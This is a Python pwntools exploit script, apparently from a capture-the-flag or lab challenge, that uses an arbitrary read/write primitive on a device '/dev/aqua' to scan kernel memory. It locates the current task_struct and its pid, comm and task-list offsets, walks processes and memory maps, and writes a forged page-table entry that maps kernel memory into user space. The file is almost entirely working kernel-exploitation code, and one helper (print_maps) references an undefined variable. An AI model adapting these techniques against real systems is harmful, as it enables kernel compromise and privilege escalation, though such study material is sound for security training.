from pwn import *

PAGE_OFFSET = 0x80000000


def get_curr(p):
    p.sendline(b'curr /dev/aqua')
    p.recvuntil(b'$$$')
    var = p.recvuntil(b'$$$')
    return int(var.rstrip(b'$$$').rstrip(), 16)


def write_int(p, data, offset):
    p.sendline(f'wd /dev/aqua {offset} 4'.encode())
    p.recvuntil(b'>')
    p.sendline(p32(data))
    p.recvuntil(b'$$$')


def get_comm(base: int, offset: int):
    result = subprocess.Popen(
        f'/tmp/AaBbCcDdEeFfGgH /dev/aqua r {base+offset} 16', shell=True, stdout=subprocess.PIPE)
    return str(result.stdout.read(), 'ascii', 'ignore').strip('\x00')


def get_next(base: int, offset: int):
    result = subprocess.Popen(
        f'/tmp/AaBbCcDdEeFfGgH /dev/aqua r {base+offset} 4', shell=True, stdout=subprocess.PIPE)
    return struct.unpack('L', result.stdout.read())[0]-offset


def get_pid(base: int, offset: int):
    result = subprocess.Popen(
        f'/tmp/AaBbCcDdEeFfGgH /dev/aqua r {base+offset} 4', shell=True, stdout=subprocess.PIPE)
    return struct.unpack('l', result.stdout.read())[0]


def get_comm_offset(strct):
    return strct.index(b'AaBbCcDdEeFfGgH')


def get_pid_offset(strct, pid):
    return strct.index(struct.pack('L', pid))


def read_int(proc, addr):
    line = f'rd /dev/aqua {addr} 4'.encode()
    proc.sendline(line)
    proc.recvuntil(b'$$$')
    var = proc.recvuntil(b'$$$')
    return struct.unpack('L', var.rstrip(b'$$$'))


def read_many(proc, start, length):
    proc.sendline(f'rd /dev/aqua {start} {length}'.encode())
    proc.recvuntil(b'$$$')
    return proc.recvuntil(b'$$$').rstrip(b'$$$')


def get_candidates_for_next(pid_offset, strct):
    '''add everything that closely resembles a valid addresss up
    to the pid offset because next comes before pid
    '''
    candidates = {}
    for i in range(0, pid_offset, 4):
        x = struct.unpack('L', strct[i:i+4])[0]
        if x & 0xc0000000 == 0x80000000:
            candidates[i] = x
    return candidates


def is_list_head_for_next(proc, off, ptr, candidates):
    '''ptr is probably a list_head if
    1. off+4 is an address (prev pointer)
    2. ptr->next->prev==ptr
    3. ptr->prev->next==ptr
    '''
    return off+4 in candidates and ptr == read_int(proc,
                                                   read_int(proc, ptr+4)[0])[0] and \
        ptr == read_int(proc,
                        read_int(proc, candidates[off+4])[0])[0]


def get_task_struct(proc):
    curr = get_curr(proc)
    proc.sendline(f'rd /dev/aqua {curr} 1500'.encode())
    proc.recvuntil(b'$$$')
    return proc.recvuntil(b'$$$')


def get_proc_interactive():
    proc = process(['/tmp/AaBbCcDdEeFfGgH', 'interactive'])
    _ = proc.recvuntil(b'$$$')
    return proc


def get_next_offset(pid_offset):
    bad_candidates = []
    while True:
        proc = get_proc_interactive()
        strct = get_task_struct(proc)
        candidates = get_candidates_for_next(pid_offset, strct)
        list_heads = []
        for off, ptr in candidates.items():
            if off in bad_candidates:
                continue
            try:
                if is_list_head_for_next(proc, off, ptr, candidates):
                    list_heads.append(off)
            except EOFError:
                bad_candidates.append(off)
                break
        else:
            proc.kill()
            break
    # `tasks` is either last or third-last in the struct (ifdefs)
    return list_heads


def get_vm_area_struct(proc, ptr):
    proc.sendline(f'rd /dev/aqua {ptr} 12'.encode())
    proc.recvuntil(b'$$$')
    res = proc.recvuntil(b'$$$')
    return struct.unpack('LLL', res.rstrip(b'$$$'))


def get_maps(proc, mm_offset, strct):
    mm_struct_ptr = struct.unpack('L', strct[mm_offset:mm_offset+4])[0]
    vm_area_struct_ptr = read_int(proc, mm_struct_ptr)[0]
    vm_start, vm_end, cur = get_vm_area_struct(proc, vm_area_struct_ptr)
    return vm_start, vm_end, cur


def print_tasks(proc, next_offset, pid_offset, comm_offset):
    curr = get_curr(proc)
    cur = get_next(curr, next_offset)
    while cur != curr:
        print(get_pid(cur, pid_offset), get_comm(cur, comm_offset), cur)
        cur = get_next(cur, next_offset)


def print_maps(proc, strct, mm_offset):
    end, start, mcurr = get_maps(proc, mm_offset, strct)
    while 0 != mcurr:
        print(f'{hex(start)}-{hex(end)}')
        end, start, mcurr = get_vm_area_struct(files, mcurr)


def virt_to_phys(virt):
    return virt-PAGE_OFFSET


def phys_to_virt(phys):
    return phys+PAGE_OFFSET


def map_to_vm(p, task_struct, mm_offset, kaddr):
    flags = 0b110001111110
    mm_ptr = u32(task_struct[mm_offset:mm_offset+4])
    pgd_offset = 0x24
    pgd_ptr = read_int(p, mm_ptr+pgd_offset)[0]
    pgd = read_many(p, pgd_ptr, 4096)
    mapped_high = None
    for i in range(0, 4096, 4):
        if u32(pgd[i:i+4]) != 0:
            mapped_high = i
            break
    pdt_ptr = phys_to_virt((u32(pgd[mapped_high:mapped_high+4]) >> 10) << 10)
    pdt = read_many(p, pdt_ptr, 4096)
    mapped_low = None
    for i in range(0, 4096, 4):
        if u32(pdt[i:i+4]) == 0:
            mapped_low = i
            break
    if kaddr == 0:
        kaddr = pdt_ptr
    pte = virt_to_phys((kaddr >> 12) << 12) | flags
    write_int(p, pte, pdt_ptr+mapped_low)
    return (mapped_high//4) << 20 | (mapped_low//4) << 12, mapped_high//4
